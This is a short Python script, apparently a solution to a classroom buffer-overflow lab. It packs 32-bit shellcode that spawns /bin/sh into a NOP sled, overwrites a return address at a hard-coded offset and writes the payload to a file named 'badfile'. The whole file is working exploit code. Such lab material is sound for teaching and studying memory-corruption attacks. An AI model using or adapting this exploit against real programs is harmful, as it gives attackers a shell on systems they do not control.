#!/usr/bin/python3
import sys

shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
   "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
   "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')



# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 
start = 100
content[start:start+len(shellcode)] = shellcode

##################################################################

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffd2ef + 0x80   # Change this number 
offset = 217 + 4              	# Change this number

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

a = 0xffffffff
b = 0x00000014

content[offset : offset + L] = (ret).to_bytes(L,byteorder='little')
content[offset+4: offset+8] = a.to_bytes(L, byteorder='little')
content[offset+8: offset+12] = b.to_bytes(L, byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
